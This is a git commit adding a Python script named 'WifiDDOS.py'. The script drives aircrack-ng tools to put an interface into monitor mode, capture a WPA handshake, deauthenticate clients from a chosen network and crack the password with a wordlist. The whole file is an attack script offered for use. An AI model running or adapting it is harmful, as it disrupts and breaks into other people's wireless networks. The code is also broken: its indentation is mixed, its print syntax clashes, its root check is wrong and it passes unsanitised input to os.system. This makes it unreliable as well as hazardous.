a3f615603db64ca64d0dc1d92165b710e9c6f3f6
megalagger <48851275+megalagger@users.noreply.github.com>
2020-04-16 10:14:50 +0300

    Initial commit

---
+++ WifiDDOS.py
@@ -0,0 +1,27 @@
+try:
+	import os, sys, time, requests
+except:
+	print("Start install.sh!!!")
+
+username = os.system("whoami")
+if username is not "root":
+    print("You must start whis root!(sudo or su)")print "You aren't root"
+else:
+	module = input("input you`r interface(if you don`t know type in new session ifconfig): ")
+    os.system("airmon-ng start " + module)
+    print("Chose wifi:")
+    os.system("airodump-ng mon0")
+    time.sleep(2)
+    bssid = input("Enter BSSID wifi whot you choose: ")
+    cannel = input("Enter canel wifi whot you choose: ")
+    print("DDOS start!")
+    os.system("airodump-ng --bssid " + bssid + "-c "+ cannel + " -w WPAcrack mon0")
+    os.system("aireplay-ng --deauth 100 -a "+bssid+" mon0")
+    chose = input("Do you have list whis password?(Y/n)\n")
+    if chose == "Y":
+    	passlist = input("Write all way to password list:\n")
+    	os.system("aircrack-ng WPAcrack-01.cap -w " + passlist)
+
+    elif chose == "N":
+    	print("Now wait!")
+    	os.system("aircrack-ng WPAcrack-01.cap -w passwordlist.txt")
